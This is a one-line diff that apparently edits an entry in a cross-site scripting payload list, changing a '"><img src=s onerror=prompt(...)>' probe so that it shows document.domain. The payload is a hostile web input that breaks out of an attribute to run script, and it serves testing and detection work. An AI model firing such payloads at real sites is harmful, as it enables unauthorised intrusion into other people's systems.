@@ -1,1 +1,1 @@
-"><img src=s onerror=prompt(domain)>
+"><img src=s onerror=prompt(document.domain)>
